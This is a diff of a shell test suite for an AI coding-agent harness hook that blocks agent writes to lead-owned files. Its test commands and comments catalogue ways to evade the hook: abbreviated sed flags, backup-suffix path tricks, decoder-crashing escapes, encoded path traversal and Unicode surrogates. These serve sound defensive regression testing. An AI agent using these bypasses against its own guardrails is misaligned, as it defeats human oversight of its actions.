+  "$(bash_command_json "sed -i --exp 's/a/b/' .harness/mld/f041d.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): -i with abbreviated bare --exp script exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F041): -i with abbreviated bare --exp denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041d.txt" \
-  "hs2 (F041): -i with abbreviated bare --exp denial names the real target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i --exp='s/a/b/' src/other/f041e.txt")")
+  "$(bash_command_json "sed -i --exp='s/a/b/' .harness/mld/f041e.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): -i with abbreviated attached --exp= exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F041): -i with abbreviated attached --exp= denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041e.txt" \
-  "hs2 (F041): -i with abbreviated attached --exp= denial names the real target"
 
 # CRITICAL: the bare-abbreviated-flag recognition above is not optional --
 # an earlier version of this fix left the bare form of --file/--expression
@@ -4826,13 +4534,11 @@ assert_contains "$OUT" "src/other/f041e.txt" \
 # that happens to look like a flag) genuinely in-place edits via --file's
 # abbreviated bare form.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i --fi -x.sed src/other/f041q.txt")")
+  "$(bash_command_json "sed -i --fi -x.sed .harness/mld/f041q.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): -i --fi with a leading-dash script-file value exits 0 (JSON deny)"
 assert_deny_json "$OUT" \
   "hs2 (F041): -i --fi leading-dash-value denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041q.txt" \
-  "hs2 (F041): -i --fi leading-dash-value denial names the real target"
 
 # Same fail-open via the OTHER discriminating value shape: a script-file
 # argument literally named "--". Confirmed against real gsed with a file
@@ -4841,24 +4547,20 @@ assert_contains "$OUT" "src/other/f041q.txt" \
 # VALUE, not the pathspec separator, since it's consumed as the previous
 # flag's argument before separator-detection ever sees it).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i --fi -- src/other/f041r.txt")")
+  "$(bash_command_json "sed -i --fi -- .harness/mld/f041r.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): -i --fi with a '--' script-file value exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F041): -i --fi '--'-value denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041r.txt" \
-  "hs2 (F041): -i --fi '--'-value denial names the real target"
 
 # The same fail-open is reachable through this PR's OWN newly-recognized
 # --in-place abbreviation, one flag later -- confirms the fix must cover
 # both the in-place guard AND the script-value recognition together.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --in-place --fi -x.sed src/other/f041s.txt")")
+  "$(bash_command_json "sed --in-place --fi -x.sed .harness/mld/f041s.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): --in-place --fi with a leading-dash value exits 0 (JSON deny)"
 assert_deny_json "$OUT" \
   "hs2 (F041): --in-place --fi leading-dash-value denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041s.txt" \
-  "hs2 (F041): --in-place --fi leading-dash-value denial names the real target"
 
 # With TWO bare abbreviated script flags, the (now-fixed) walking loop
 # must land on the REAL file, not misname the second script fragment --
@@ -4866,12 +4568,10 @@ assert_contains "$OUT" "src/other/f041s.txt" \
 # mis-naming (both flags recognized, or neither, never one bare-form
 # recognized and the other not).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i --exp 's/a/b/' --exp 's/c/d/' src/other/f041t.txt")")
+  "$(bash_command_json "sed -i --exp 's/a/b/' --exp 's/c/d/' .harness/mld/f041t.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): two bare abbreviated --exp flags exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F041): two bare --exp flags denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041t.txt" \
-  "hs2 (F041): two bare --exp flags denial names the REAL file, not a script fragment"
 
 # No new false positive, AND a pre-existing false positive is fixed as a
 # side effect: before recognizing --fi as an abbreviation of --file, an
@@ -4883,7 +4583,7 @@ assert_contains "$OUT" "src/other/f041t.txt" \
 # all) and performs no in-place edit, the same "value that looks like a
 # flag" class PR #52 round 4 fixed for the exact-spelling form.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --fi -i.bak src/other/f041u.txt src/other/f041v.txt")")
+  "$(bash_command_json "sed --fi -i.bak .harness/mld/f041u.txt .harness/mld/f041v.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): --fi -i.bak (no real in-place edit) passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
@@ -4904,27 +4604,25 @@ assert_not_contains "$OUT" "permissionDecision" \
 # genuinely in-place edits ("--" is --file's own abbreviated value, so
 # "-i" is still parsed as a real flag afterward).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --fi -- -i src/other/f041w.txt")")
+  "$(bash_command_json "sed --fi -- -i .harness/mld/f041w.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): --fi -- -i (separator-index abbreviation) exits 0 (JSON deny)"
 assert_deny_json "$OUT" \
   "hs2 (F041): --fi -- -i denial uses JSON deny form"
-assert_contains "$OUT" "src/other/f041w.txt" \
-  "hs2 (F041): --fi -- -i denial names the real target"
 
-# No new false positive: an in-scope abbreviated --i must still be allowed,
+# No new false positive: an ordinary abbreviated --i must still be allowed,
 # and an AMBIGUOUS abbreviation (--f, which real GNU sed itself rejects as
 # ambiguous between --file and --follow-symlinks) must not be misread as
 # unlocking the in-place guard.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed --i 's/a/b/' src/parser/f041f.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F041): an in-scope abbreviated --i passes, rc 0"
+assert_rc0 "$RC" "hs2 (F041): an ordinary abbreviated --i passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F041): in-scope abbreviated --i has no deny fields"
+  "hs2 (F041): ordinary abbreviated --i has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --f script.sed src/other/f041g.txt")")
+  "$(bash_command_json "sed --f script.sed .harness/mld/f041g.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F041): an ambiguous --f passes, rc 0 (real sed errors, no in-place edit)"
 assert_not_contains "$OUT" "permissionDecision" \
@@ -4934,31 +4632,32 @@ assert_not_contains "$OUT" "permissionDecision" \
 # target whenever it contains "*" -- GNU sed replaces every "*" with the
 # file argument exactly as given and resolves the result relative to the
 # CURRENT directory, not the file's own directory, so a suffix like
-# "../other/*" can genuinely write the backup somewhere entirely different
-# from the file being edited (confirmed against real gsed 4.10). Before
-# this, sed_inplace_targets() only ever checked the file argument, never
-# this second target hiding inside the suffix's own value.
+# ".harness/mld/*" can genuinely write the backup somewhere entirely
+# different from the file being edited (confirmed against real gsed 4.10).
+# Before this, sed_inplace_targets() only ever checked the file argument,
+# never this second target hiding inside the suffix's own value. Every case
+# below edits an ORDINARY file, so the suffix-derived path is the only thing
+# that can produce a denial.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i../other/'*' 's/a/b/' src/parser/f049a.txt")")
+  "$(bash_command_json "sed -i.harness/mld/'*' 's/a/b/' f049a.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F049): attached '-i../other/*' backup-suffix target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F049): attached '-i../other/*' denial uses JSON deny form"
-assert_contains "$OUT" "other/src/parser/f049a.txt" \
-  "hs2 (F049): denial names the real out-of-scope backup path"
+assert_rc0 "$RC" "hs2 (F049): attached '-i.harness/mld/*' backup-suffix target exits 0 (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F049): attached '-i.harness/mld/*' denial uses JSON deny form"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed --in-place=../other/'*' 's/a/b/' src/parser/f049b.txt")")
+  "$(bash_command_json "sed --in-place=.harness/mld/'*' 's/a/b/' f049b.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F049): long-form '--in-place=../other/*' backup-suffix target exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F049): long-form '--in-place=../other/*' denial uses JSON deny form"
-assert_contains "$OUT" "other/src/parser/f049b.txt" \
-  "hs2 (F049): long-form denial names the real out-of-scope backup path"
+assert_rc0 "$RC" "hs2 (F049): long-form '--in-place=.harness/mld/*' backup-suffix target exits 0 (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F049): long-form '--in-place=.harness/mld/*' denial uses JSON deny form"
 
 # Multiple files: each file gets its OWN backup at the suffix-derived path
 # (confirmed against real gsed: two file arguments produce two independent
-# backups), so both must be checked, not just the first.
+# backups), so both must be checked, not just the first. The FIRST file's
+# derived backup traverses back out of the lead-owned directory
+# (".harness/mld/../f049e.txt" -> ".harness/f049e.txt") and is allowed, so
+# only checking the second file's derived path can produce this denial.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i../other/'*' 's/a/b/' src/parser/f049e.txt src/parser/f049f.txt")")
+  "$(bash_command_json "sed -i.harness/mld/'*' 's/a/b/' ../f049e.txt f049f.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F049): multi-file backup-suffix target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F049): multi-file denial uses JSON deny form"
@@ -4967,7 +4666,7 @@ assert_deny_json "$OUT" "hs2 (F049): multi-file denial uses JSON deny form"
 # overrides an earlier one's suffix, not just its presence: an earlier
 # asterisk-bearing suffix must not survive if a later -i replaces it.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i.bak -i../other/'*' 's/a/b/' src/parser/f049g.txt")")
+  "$(bash_command_json "sed -i.bak -i.harness/mld/'*' 's/a/b/' f049g.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F049): a later -i's suffix wins over an earlier one exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F049): later-suffix-wins denial uses JSON deny form"
@@ -4976,7 +4675,7 @@ assert_deny_json "$OUT" "hs2 (F049): later-suffix-wins denial uses JSON deny for
 # entirely (no backup at all, per real gsed), not just fail to add a new
 # target -- confirming this doesn't over-deny.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i../other/'*' -i 's/a/b/' src/parser/f049h.txt")")
+  "$(bash_command_json "sed -i.harness/mld/'*' -i 's/a/b/' f049h.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F049): a later bare -i cancelling an earlier suffix passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
@@ -4993,26 +4692,21 @@ assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F049): ordinary '.bak' suffix has no deny fields"
 
 # No new false positive: an asterisk-bearing suffix whose DERIVED path is
-# still in scope must be allowed cleanly.
+# ordinary must be allowed cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed -isrc/parser/backup_'*' 's/a/b/' src/parser/f049d.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F049): an in-scope derived backup path passes, rc 0"
+assert_rc0 "$RC" "hs2 (F049): an ordinary derived backup path passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F049): in-scope derived backup path has no deny fields"
+  "hs2 (F049): ordinary derived backup path has no deny fields"
 
 # Documented residual (adversarial review of PR #83): an ANSI-C-escaped
 # asterisk in the suffix (e.g. $'\x2a') is invisible to the RAW-string
 # ".replace("*", tok)" substitution, so the derived "target" ends up as a
-# bare, undecoded "*" rather than the true substituted path -- this can
-# only ever wrongly DENY an otherwise in-scope command, never bypass one
-# (locked in here as an over-deny, not a regression test for a fix).
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -i$'"'"'\x2a'"'"' '"'"'s/a/b/'"'"' src/parser/f049i.txt')")
-RC=$?
-assert_rc0 "$RC" "hs2 (F049): ANSI-C-escaped asterisk suffix residual exits 0 (JSON deny)"
-assert_deny_json "$OUT" \
-  "hs2 (F049): ANSI-C-escaped asterisk residual over-denies, never bypasses"
+# bare, undecoded "*" rather than the true substituted path. Under a
+# scope-pattern comparison that was an observable over-deny, pinned here as
+# such; against the lead-owned set a bare "*" simply never matches, so the
+# residual is inert and has no observable behavior left to assert.
 
 # F042: a decoder exception (currently none are known -- F038 rounds 2-3
 # hardened the only two found so far -- but this hook's own design is
@@ -5029,8 +4723,8 @@ assert_deny_json "$OUT" \
 # undecoded text against scope patterns on a decoder exception, reasoning
 # it "essentially never" matches a real scope prefix. Adversarial review
 # of PR #73 disproved that: an attacker who controls where the crash
-# lands can trivially place it AFTER an in-scope-looking prefix (e.g.
-# "src/parser/"), making the raw fallback text itself look in-scope --
+# lands can trivially place it AFTER an ordinary-looking prefix (e.g.
+# "src/parser/"), making the raw fallback text itself look ordinary --
 # the exact same construction round 1's own tests used to prove
 # "processing continues past the crash" was ALSO a genuine bypass.
 # ROUND 2 (this version) denies UNCONDITIONALLY on any analysis failure,
@@ -5045,10 +4739,9 @@ assert_deny_json "$OUT" \
 # assertion below would still pass anyway, testing nothing (found by
 # adversarial review of PR #73: confirmed live that a deliberately broken
 # marker still yields "0 failed" without this guard).
-DIR_HS_F042="$WORK/ht-scope-f042"
-make_fixture "$DIR_HS_F042"
-install_hooks "$DIR_HS_F042"
-printf 'src/parser/\n' > "$DIR_HS_F042/.claude/teammate-scope.txt"
+DIR_HS_F042_MAIN="$WORK/ht-scope-f042"
+make_worktree_fixture "$DIR_HS_F042_MAIN"
+DIR_HS_F042="$DIR_HS_F042_MAIN-wt"
 if ! python3 - "$DIR_HS_F042/.claude/hooks/enforce-scope.sh" <<'PYEOF'
 import sys
 path = sys.argv[1]
@@ -5070,9 +4763,9 @@ fi
 # bypasses every earlier _flag_view() call -- unlike cp/mv/tee/rm/sed
 # targets, whose OWN flag/command-name recognition already calls the
 # same decoder first) must deny the whole segment, not silently allow
-# the real out-of-scope target alongside it.
+# the real lead-owned target alongside it.
 OUT=$(run_hook "$DIR_HS_F042" enforce-scope.sh \
-  "$(bash_command_json "echo x > src/parser/\$'\Qtrigger'.txt 2> src/other/f042a.txt")")
+  "$(bash_command_json "echo x > src/parser/\$'\Qtrigger'.txt 2> .harness/mld/f042a.txt")")
 RC=$?
 assert_rc0 "$RC" "hs2 (F042): a decoder crash on a redirect target exits 0 (JSON deny)"
 assert_deny_json "$OUT" \
@@ -5094,18 +4787,18 @@ assert_contains "$OUT" "could not be safely analyzed" \
   "hs2 (F042): command-name-recognition-crash denial states analysis failure"
 
 # CRITICAL regression test (adversarial review of PR #73, round 1): a
-# crash positioned immediately AFTER a valid in-scope prefix must NOT be
+# crash positioned immediately AFTER a valid ordinary prefix must NOT be
 # silently allowed just because the raw/fallback text happens to start
 # with "src/parser/" -- confirmed live against round 1 of this fix that
 # this exact shape was a genuine bypass (the crash during command-name
 # recognition fell back to the whole raw segment, which itself starts
-# with the scope prefix, so it was wrongly ALLOWED even though the
-# command's own real redirect target is genuinely out of scope).
+# with an ordinary-looking prefix, so it was wrongly ALLOWED even though the
+# command's own real redirect target is genuinely lead-owned).
 OUT=$(run_hook "$DIR_HS_F042" enforce-scope.sh \
-  "$(bash_command_json "src/parser/\$'\Qx' > src/other/f042c.txt")")
+  "$(bash_command_json "src/parser/\$'\Qx' > .harness/mld/f042c.txt")")
 RC=$?
 assert_rc0 "$RC" \
-  "hs2 (F042): a crash positioned after a valid scope prefix still exits 0 (JSON deny)"
+  "hs2 (F042): a crash positioned after a valid ordinary prefix still exits 0 (JSON deny)"
 assert_deny_json "$OUT" \
   "hs2 (F042): crash-after-valid-prefix denial uses JSON deny form (NOT a silent allow)"
 
@@ -5117,18 +4810,18 @@ OUT=$(run_hook "$DIR_HS_F042" enforce-scope.sh \
   "$(bash_command_json "echo x > src/parser/y\$'\Q\x2f\x2e\x2e\x2fother\x2fevil.txt'")")
 RC=$?
 assert_rc0 "$RC" \
-  "hs2 (F042): a redirect-target crash after a valid scope prefix still exits 0 (JSON deny)"
+  "hs2 (F042): a redirect-target crash after a valid ordinary prefix still exits 0 (JSON deny)"
 assert_deny_json "$OUT" \
   "hs2 (F042): redirect-target crash-after-valid-prefix denial uses JSON deny form"
 
-# No new false positive: an ordinary in-scope command with no crash-
+# No new false positive: an ordinary command with no crash-
 # inducing content anywhere must still be allowed.
 OUT=$(run_hook "$DIR_HS_F042" enforce-scope.sh \
   "$(bash_command_json "echo x > src/parser/normal.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2 (F042): an ordinary in-scope command with no crash passes, rc 0"
+assert_rc0 "$RC" "hs2 (F042): an ordinary command with no crash passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2 (F042): ordinary in-scope command has no deny fields"
+  "hs2 (F042): ordinary command has no deny fields"
 
 # F043: the FILE_PATH/COMMAND extraction near the top of this hook fails
 # open the same way _decode_ansi_c_escape() did before F038/F042, but
@@ -5139,21 +4832,32 @@ assert_not_contains "$OUT" "permissionDecision" \
 # at all -- but crashes the extraction script's own final print() with
 # UnicodeEncodeError once stdout isn't a tty. The 2>/dev/null on that
 # command substitution swallowed the traceback, FILE_PATH/COMMAND came
-# back empty, and "if [ -n \"\$FILE_PATH\" ]" skipped the ENTIRE scope
+# back empty, and "if [ -n \"\$FILE_PATH\" ]" skipped the ENTIRE lead-owned
 # check -- silently allowing what should have gone through this file's
 # own AUTHORITATIVE file_path gate. Fixed with two distinct python-side
 # exit codes (2 = JSON couldn't be parsed at all, stays fail-open per
 # this file's own documented contract; 1 = parsed fine but unsafe to
 # process further, fails closed) so the fix doesn't accidentally reverse
 # the existing fail-open behavior for genuinely malformed input.
-OUT_SURROGATE_PATH_JSON="{\"tool_input\":{\"file_path\":\"$DIR_HS/src/other/f043a.txt\ud800\"}}"
+OUT_SURROGATE_PATH_JSON="{\"tool_input\":{\"file_path\":\"$DIR_HS/.harness/mld/f043a.txt\ud800\"}}"
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$OUT_SURROGATE_PATH_JSON" 2>&1)
 RC=$?
 assert_rc2 "$RC" "hs2 (F043): a raw surrogate in file_path exits 2 (blocked), not silently allowed"
 assert_contains "$OUT" "could not be safely extracted" \
   "hs2 (F043): surrogate-in-file_path denial states extraction failure"
 
-OUT_SURROGATE_CMD_JSON="{\"tool_input\":{\"command\":\"rm src/other/f043b.txt\ud800\"}}"
+# F053: Claude Code discards a hook's stdout entirely on exit 2 and feeds only
+# stderr back to the blocked agent (the identical defect F046 fixed in
+# check-remaining-tasks.sh.template). This extraction-failure block is the only
+# exit-2 path enforce-scope.sh still has, so it is where the mechanism is
+# pinned: stdout alone must be empty, stderr alone must carry the message.
+STDOUT_ONLY=$(run_hook "$DIR_HS" enforce-scope.sh "$OUT_SURROGATE_PATH_JSON" 2>/dev/null)
+assert_empty "$STDOUT_ONLY" "hs2 (F053): the exit-2 extraction block writes nothing to stdout"
+STDERR_ONLY=$(run_hook "$DIR_HS" enforce-scope.sh "$OUT_SURROGATE_PATH_JSON" 2>&1 1>/dev/null)
+assert_contains "$STDERR_ONLY" "could not be safely extracted" \
+  "hs2 (F053): the exit-2 extraction block message is on stderr specifically"
+
+OUT_SURROGATE_CMD_JSON="{\"tool_input\":{\"command\":\"rm .harness/mld/f043b.txt\ud800\"}}"
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh "$OUT_SURROGATE_CMD_JSON")
 RC=$?
 assert_rc0 "$RC" "hs2 (F043): a raw surrogate in command exits 0 (JSON deny), not silently allowed"
@@ -7562,11 +7266,18 @@ if [ -f "$RUNBOOK" ]; then
       fail "mnt: maintenance-runbook.md is missing a '## $HEADER' section"
     fi
   done
+  # OVI-144 Phase 3 retired probe item 1 (the plan_approval_response delivery
+  # bug) together with item 2: the workaround it tracked lived in the Agent
+  # Teams protocol doc, deleted with the Teams machinery, so there is no
+  # FIXED/BROKEN criterion left to state. Pin the dated retirement record
+  # instead -- the same shape probe item 6's retirement is pinned with below,
+  # so a silently deleted probe still fails this suite.
   if grep -q "plan_approval_response" "$RUNBOOK" \
-    && grep -q "FIXED" "$RUNBOOK" && grep -q "BROKEN" "$RUNBOOK"; then
-    pass "mnt: runbook's probe checklist gives a concrete FIXED/BROKEN criterion"
+    && grep -q "Retired 2026-08-12" "$RUNBOOK" \
+    && grep -q "no workaround left to" "$RUNBOOK"; then
+    pass "mnt: the runbook records probe item 1's retirement (OVI-144 Phase 3)"
   else
-    fail "mnt: runbook's plan_approval_response probe is missing a FIXED/BROKEN criterion"
+    fail "mnt: the runbook is missing probe item 1's retirement record"
   fi
 else
   fail "mnt: docs/maintenance-runbook.md does not exist"
@@ -9686,51 +9397,41 @@ print(json.dumps({'hook_event_name': 'PreToolUse', 'session_id': sys.argv[2],
 " "$1" "$2"
 }
 
-# --- enforce-scope.sh: 5 decision points (deny_json, the line-179 legacy
-# exit 2, the line-280ish legacy exit 2, one allow, one skipped) ---
+# --- enforce-scope.sh: 4 decision points (deny_json, the unsafe-extraction
+# legacy exit 2, one allow, one skipped) ---
 
-DIR_ES89="$WORK/f089-enforce-scope"
-make_fixture "$DIR_ES89"
-install_hooks "$DIR_ES89"
+DIR_ES89_MAIN="$WORK/f089-enforce-scope"
+make_worktree_fixture "$DIR_ES89_MAIN"
+DIR_ES89="$DIR_ES89_MAIN-wt"
 ES89_LOG="$DIR_ES89/.harness/dashboard/es89sess.jsonl"
+ES89_MAIN_LOG="$DIR_ES89_MAIN/.harness/dashboard/es89sess.jsonl"
 
-# Skipped: no scope file at all -- this hook isn't applicable to this teammate.
-OUT=$(run_hook_dashboard "$DIR_ES89" enforce-scope.sh \
-  "$(f089_edit_json "$DIR_ES89/src/parser/x.py" "es89sess")")
+# Skipped: the main checkout, where the guard is structurally unarmed (OVI-144
+# Phase 3) -- this hook isn't applicable to the lead's own session.
+OUT=$(run_hook_dashboard "$DIR_ES89_MAIN" enforce-scope.sh \
+  "$(f089_edit_json "$DIR_ES89_MAIN/src/parser/x.py" "es89sess")")
 RC=$?
-assert_rc0 "$RC" "f089-es: no scope file still exits 0"
-LINE=$(cat "$ES89_LOG" 2>/dev/null)
+assert_rc0 "$RC" "f089-es: an unarmed main checkout still exits 0"
+LINE=$(cat "$ES89_MAIN_LOG" 2>/dev/null)
 assert_contains "$LINE" '"gate": "enforce-scope"' "f089-es: skipped entry names the gate"
-assert_contains "$LINE" '"verdict": "skipped"' "f089-es: no scope file logs verdict=skipped"
+assert_contains "$LINE" '"verdict": "skipped"' "f089-es: an unarmed main checkout logs verdict=skipped"
 assert_not_contains "$LINE" '"verdict": "allow"' "f089-es: a not-applicable early exit is never logged as allow"
 
-printf 'src/parser/\n' > "$DIR_ES89/.claude/teammate-scope.txt"
-
-# Allow: an in-scope edit reaches the legacy while-loop's own exit 0.
+# Allow: an ordinary edit inside the worktree reaches the final exit 0.
 > "$ES89_LOG"
 OUT=$(run_hook_dashboard "$DIR_ES89" enforce-scope.sh \
   "$(f089_edit_json "$DIR_ES89/src/parser/x.py" "es89sess")")
 RC=$?
-assert_rc0 "$RC" "f089-es: an in-scope edit still exits 0"
+assert_rc0 "$RC" "f089-es: an ordinary edit still exits 0"
 LINE=$(cat "$ES89_LOG" 2>/dev/null)
-assert_contains "$LINE" '"verdict": "allow"' "f089-es: an in-scope edit logs verdict=allow"
-
-# Block (legacy exit 2, out-of-scope Edit/Write/MultiEdit denial).
-> "$ES89_LOG"
-OUT=$(run_hook_dashboard "$DIR_ES89" enforce-scope.sh \
-  "$(f089_edit_json "$DIR_ES89/src/other/y.py" "es89sess")" 2>&1)
-RC=$?
-assert_rc2 "$RC" "f089-es: an out-of-scope edit still exits 2"
-LINE=$(cat "$ES89_LOG" 2>/dev/null)
-assert_contains "$LINE" '"verdict": "block"' "f089-es: out-of-scope edit logs verdict=block"
-assert_contains "$LINE" '"finding": "scope-violation:out-of-scope-edit"' \
-  "f089-es: out-of-scope edit logs its finding class"
-assert_not_contains "$LINE" "src/other/y.py" \
-  "f089-es: the block entry never logs the raw file path"
+assert_contains "$LINE" '"verdict": "allow"' "f089-es: an ordinary edit logs verdict=allow"
 
 # Block (legacy exit 2 at the FILE_PATH_RC -eq 1 site -- a raw surrogate
 # crashes the extraction script's own print(), same F043 shape used elsewhere
-# in this file's own existing tests).
+# in this file's own existing tests). This is the only exit-2 site left in the
+# hook: the out-of-scope-edit site it shared this cluster with retired with
+# OVI-144 Phase 3, along with the "scope-violation:out-of-scope-edit" finding
+# class.
 > "$ES89_LOG"
 ES89_JSON_SURROGATE="{\"hook_event_name\":\"PreToolUse\",\"session_id\":\"es89sess\",\"tool_input\":{\"file_path\":\"$DIR_ES89/src/parser/f089\ud800.py\"}}"
 OUT=$(run_hook_dashboard "$DIR_ES89" enforce-scope.sh "$ES89_JSON_SURROGATE" 2>&1)
@@ -9741,15 +9442,13 @@ assert_contains "$LINE" '"verdict": "block"' "f089-es: the unsafe-extraction sit
 assert_contains "$LINE" '"finding": "scope-violation:unsafe-extraction"' \
   "f089-es: the unsafe-extraction site logs its finding class"
 
-# Block (deny_json(), covering all five of its own call sites -- exercised
-# here via a lead-owned state file denial). F089 round 2 (adversarial
-# review): deny_json() used to log a single bare "scope-violation" finding
-# for every one of its five call sites, indistinguishable from each other
-# and from the two OTHER finding classes this file emits from its legacy
-# exit-2 paths ("scope-violation:out-of-scope-edit",
-# "scope-violation:unsafe-extraction") -- deny_json() now takes its own
-# finding-class argument, following the same "scope-violation:<site>"
-# convention.
+# Block (deny_json(), covering all of its own call sites -- exercised here via
+# a lead-owned state file denial). F089 round 2 (adversarial review):
+# deny_json() used to log a single bare "scope-violation" finding for every one
+# of its call sites, indistinguishable from each other and from the
+# "scope-violation:unsafe-extraction" class the legacy exit-2 path emits --
+# deny_json() now takes its own finding-class argument, following the same
+# "scope-violation:<site>" convention.
 > "$ES89_LOG"
 OUT=$(run_hook_dashboard "$DIR_ES89" enforce-scope.sh \
   "$(f089_edit_json "$DIR_ES89/.harness/features.json" "es89sess")")
@@ -9762,36 +9461,40 @@ assert_contains "$LINE" '"finding": "scope-violation:lead-owned-state-file"' \
   "f089-es: the deny_json() site logs a distinguishing (not bare) finding class"
 assert_contains "$LINE" '"hook_event_name": "PreToolUse"' \
   "f089-es: the deny_json() log entry carries hook_event_name from the payload"
+assert_not_contains "$LINE" ".harness/features.json" \
+  "f089-es: the block entry never logs the raw file path"
 
-# A DIFFERENT deny_json() call site (an out-of-scope Bash write, routed
-# through the DENY_REASON python scan near the end of this file) must log a
-# DIFFERENT finding class than the lead-owned-state-file site above -- proof
-# the five call sites are no longer merged into one ambiguous bucket.
+# A DIFFERENT deny_json() call site (a lead-owned Bash write, routed through
+# the DENY_REASON python scan near the end of the hook) must log a DIFFERENT
+# finding class than the Edit/Write site above -- proof the call sites are no
+# longer merged into one ambiguous bucket.
 > "$ES89_LOG"
 OUT=$(run_hook_dashboard "$DIR_ES89" enforce-scope.sh \
-  "$(f089_bash_json "rm -f $DIR_ES89/src/other/y.py" "es89sess")")
+  "$(f089_bash_json "rm -f .harness/features.json" "es89sess")")
 RC=$?
-assert_rc0 "$RC" "f089-es: an out-of-scope Bash write deny_json() denial still exits 0 (JSON deny)"
-assert_deny_json "$OUT" "f089-es: an out-of-scope Bash write denial still emits the deny JSON"
+assert_rc0 "$RC" "f089-es: a lead-owned Bash write deny_json() denial still exits 0 (JSON deny)"
+assert_deny_json "$OUT" "f089-es: a lead-owned Bash write denial still emits the deny JSON"
 LINE=$(cat "$ES89_LOG" 2>/dev/null)
-assert_contains "$LINE" '"finding": "scope-violation:out-of-scope-command"' \
+assert_contains "$LINE" '"finding": "scope-violation:lead-owned-bash-write"' \
   "f089-es: the Bash-write deny_json() site logs its own distinct finding class"
 
-# Disabled by default: no VV_HARNESS_DASHBOARD set, same fixture/scope, must
-# not create a dashboard directory, and the gate's own verdict is unaffected.
-DIR_ES89_OFF="$WORK/f089-enforce-scope-disabled"
-make_fixture "$DIR_ES89_OFF"
-install_hooks "$DIR_ES89_OFF"
-printf 'src/parser/\n' > "$DIR_ES89_OFF/.claude/teammate-scope.txt"
+# Disabled by default: no VV_HARNESS_DASHBOARD set, same armed fixture shape,
+# must not create a dashboard directory, and the gate's own verdict is
+# unaffected.
+DIR_ES89_OFF_MAIN="$WORK/f089-enforce-scope-disabled"
+make_worktree_fixture "$DIR_ES89_OFF_MAIN"
+DIR_ES89_OFF="$DIR_ES89_OFF_MAIN-wt"
 OUT=$(run_hook "$DIR_ES89_OFF" enforce-scope.sh \
-  "$(f089_edit_json "$DIR_ES89_OFF/src/other/y.py" "offsess")" 2>&1)
+  "$(f089_edit_json "$DIR_ES89_OFF/.harness/features.json" "offsess")")
 RC=$?
-assert_rc2 "$RC" "f089-es: disabled logging does not change the gate's own verdict"
+assert_rc0 "$RC" "f089-es: disabled logging does not change the gate's own verdict"
+assert_deny_json "$OUT" "f089-es: disabled logging still emits the deny JSON"
 if [ ! -e "$DIR_ES89_OFF/.harness/dashboard" ]; then
   pass "f089-es: disabled logging creates no dashboard directory"
 else
   fail "f089-es: disabled logging creates no dashboard directory -- it exists"
 fi
+
 
 # --- commit-gate.sh: 3 decision points (both deny_json() call sites, one allow) ---
 
